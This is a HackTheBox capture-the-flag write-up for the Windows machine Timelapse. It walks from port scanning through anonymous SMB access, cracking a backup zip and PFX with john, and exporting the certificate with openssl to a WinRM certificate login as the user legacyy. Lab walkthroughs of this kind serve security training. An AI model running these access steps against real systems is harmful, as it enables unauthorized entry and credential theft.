---
title: "Timelapse"
date: 2026-07-30 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, easy, smb, anonymous-access, password-cracking, pfx, winrm, certificate-auth]
image:
    path: /assets/Images/Timelapse-avatar.png
    alt: Timelapse
description: "An anonymously readable SMB share leaks a WinRM credential backup whose zip and PFX are protected by dictionary-weak passwords; cracking both with john exports a client certificate that authenticates to WinRM over TLS for the user flag."
---
## Overview

Timelapse is an easy-difficulty Windows domain controller whose path to user is a credential-hygiene failure. A non-default SMB share is readable with no authentication and contains a backup of WinRM authentication material. The backup zip and the PFX inside it are both locked with weak, crackable passwords; once cracked, the PFX yields a client certificate and private key that WinRM accepts for certificate-based logon over TLS — no password ever typed. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 233.7,122.8 150.0,150.0 137.1,167.8 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Real-world credential-hygiene box: anonymous SMB share leaks a backup, john cracks weak zip and PFX passwords, and a client cert authenticates WinRM; no CVE, point-and-click tooling, moderate enumeration.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | domain controller |
| 88/tcp | Kerberos | AD DC |
| 135/tcp | MSRPC | |
| 139/445/tcp | SMB | anonymous `Shares` readable |
| 389/636/tcp | LDAP/LDAPS | domain `timelapse.htb` |
| 464/tcp | kpasswd | |
| 593/tcp | RPC over HTTP | |
| 5986/tcp | WinRM | HTTPS / TLS |
| 9389/tcp | ADWS | .NET AD Web Services |

```bash
nmap -p- --min-rate=1000 -T4 10.10.10.X
nmap -p53,88,135,139,389,445,464,593,636,5986,9389 -sC -sV 10.10.10.X
```

The host is a domain controller for `timelapse.htb`, and the standout is **WinRM on 5986 (HTTPS)** rather than the usual 5985 — a hint that certificate-based auth is in play.

## Enumeration

SMB allows anonymous listing, and a non-default `Shares` share is readable with no credentials:

```bash
smbclient -L //10.10.10.X/ -N
smbclient //10.10.10.X/Shares -N -c "recurse; ls"
```

The share holds `Dev/winrm_backup.zip` and a `HelpDesk/` folder. Pull the backup:

```bash
smbclient //10.10.10.X/Shares -N -c "cd Dev; get winrm_backup.zip /tmp/winrm_backup.zip"
```

## Foothold

**1 — Crack the zip.** The archive is password-protected, but the PKZIP password is a dictionary word. Extract the hash and crack it against `rockyou.txt`:

```bash
zip2john /tmp/winrm_backup.zip > /tmp/zip.john
john /tmp/zip.john --wordlist=/usr/share/wordlists/rockyou.txt
```

This recovers `supremelegacy`. Extract the archive to reveal `legacyy_dev_auth.pfx`:

```bash
7z x -psupremelegacy /tmp/winrm_backup.zip -o/tmp/winrm_backup
```

**2 — Crack the PFX.** The PFX is itself password-protected, again with a weak password. PKCS#12 uses PBE, so `pfx2john` turns it into a John-compatible hash:

```bash
pfx2john /tmp/winrm_backup/legacyy_dev_auth.pfx > /tmp/pfx.john
john /tmp/pfx.john --wordlist=/usr/share/wordlists/rockyou.txt
```

This recovers `thuglegacy`.

**3 — Export the cert and key.** With the PFX password, split the PKCS#12 bundle into an unencrypted private key and the client certificate:

```bash
openssl pkcs12 -in /tmp/winrm_backup/legacyy_dev_auth.pfx -nocerts -out /tmp/key.pem -nodes -passin pass:thuglegacy
openssl pkcs12 -in /tmp/winrm_backup/legacyy_dev_auth.pfx -nokeys -out /tmp/cert.pem -passin pass:thuglegacy
```

**4 — WinRM certificate auth.** WinRM over HTTPS (5986) maps this certificate to the domain account `legacyy`, so the cert/key pair logs in with no password and no MFA:

```bash
evil-winrm -i 10.10.10.X -c /tmp/cert.pem -k /tmp/key.pem -S
```

## User flag

A shell as `legacyy` reads the user flag directly:

```powershell
type C:\Users\legacyy\Desktop\user.txt
# [redacted]
```

WinRM access as `legacyy` and the user flag are ours.

Lateral movement and privilege escalation are left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Timelapse-avatar.png" alt="Timelapse" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
